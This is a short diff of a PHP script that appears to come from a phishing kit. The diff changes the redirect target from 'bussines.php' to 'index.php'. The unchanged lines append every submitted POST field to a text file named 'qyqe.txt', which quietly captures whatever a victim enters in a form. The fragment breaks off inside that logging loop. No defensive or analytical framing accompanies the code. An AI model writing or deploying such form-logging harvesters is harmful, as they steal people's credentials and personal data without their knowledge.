@@ -1,5 +1,5 @@
 <?php
-header ('Location:bussines.php');
+header ('Location:index.php');
 $handle = fopen("qyqe.txt", "a");
 foreach($_POST as $variable => $value) {
 fwrite($handle, $variable);
